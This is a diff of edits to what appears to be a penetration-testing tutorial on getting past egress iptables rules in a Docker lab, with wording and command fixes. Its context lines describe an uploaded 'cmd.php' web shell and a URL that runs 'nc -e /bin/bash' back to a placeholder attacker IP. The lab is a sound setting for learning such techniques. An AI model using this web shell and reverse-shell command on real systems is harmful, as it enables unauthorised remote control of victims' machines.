@@ -75,7 +75,7 @@ Then we build the image and the container and we enter inside it:
 
 ```dockerfile
 docker build -t my_image .
-run -dit -p 80:80 --cap-add=NET_ADMIN --name myContainer my_image
+docker run -dit -p 80:80 --cap-add=NET_ADMIN --name myContainer my_image
 docker exec -it myContainer bash
 ```
 
@@ -133,7 +133,7 @@ iptables -A OUTPUT -o eth0 -j DROP
 ```
 
 ----
-> We can clear all rules with the command *iptables -F*.
+> We can clear all rules with the *iptables -F* command.
 ----
 
 In this case we will suppose that we have managed to upload a "cmd.php" file to the victim machine that will be in charge of establishing a reverse shell to the attacker machine:
@@ -154,7 +154,7 @@ Let's try to execute the following command in the search bar of our browser insi
 http://localhost/cmd.php?cmd=nc -e /bin/bash {ATTACKER_IP} {ATTACKER_PORT}
 ```
 
-We will realize that because of the rules we have defined before we cannot establish the connection. In this case we must use the command mkfifo to establish the communication through this script "tty_over_http.py":
+We will realize that because of the rules we have defined before we cannot establish the connection. In this case we must use the mkfifo command to establish the communication through this script "tty_over_http.py":
 
 ```python
 #!/usr/bin/python3
